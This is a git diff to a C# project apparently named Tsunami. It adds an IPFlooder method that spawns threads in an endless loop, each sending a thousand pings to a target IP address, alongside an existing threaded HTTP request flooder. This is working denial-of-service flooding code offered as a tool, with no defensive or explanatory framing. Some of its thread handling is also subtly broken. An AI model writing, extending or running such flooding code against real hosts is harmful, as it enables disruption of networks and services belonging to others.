@@ -4,6 +4,8 @@ using System.Linq;
 using System.Net;
 using System.Text;
 using System.Threading.Tasks;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
 
 namespace Tsunami.Handlers
 {
@@ -22,6 +24,11 @@ namespace Tsunami.Handlers
                     ThreadStart threadInfo = new(() => HttpRequestThread(url));
                     Thread mainThread = new(threadInfo);
                     mainThread.Start();
+
+                    if (mainThread.ThreadState == ThreadState.Stopped)
+                    {
+                        mainThread.Abort();
+                    }
                 }
             }
         }
@@ -38,6 +45,39 @@ namespace Tsunami.Handlers
             string data = reader.ReadToEnd();
 
             Console.WriteLine(data);
+        }
+
+        public static void IPFlooder(string ip, int mainNum, int multiplier = 100)
+        {
+            Console.WriteLine($"Flooding {ip}");
+
+            IPAddress addr = IPAddress.Parse(ip);
+
+            while (true)
+            {
+                for (int x = 0; x < mainNum * multiplier; x++)
+                {
+                    ThreadStart threadInfo = new(() => PingThread(addr));
+                    Thread mainThread = new(threadInfo);
+                    mainThread.Start();
+
+                    if(mainThread.ThreadState == ThreadState.Stopped)
+                    {
+                        mainThread.Abort();
+                    }
+                }
+            }
+        }
+
+        public static async Task PingThread(IPAddress addr)
+        {
+            Ping p = new();
+            
+            for(int x = 0; x < 1000; x++)
+            {
+                p.Send(addr);
+                Console.WriteLine("Ping Sent");
+            }        
         }
     }
 }
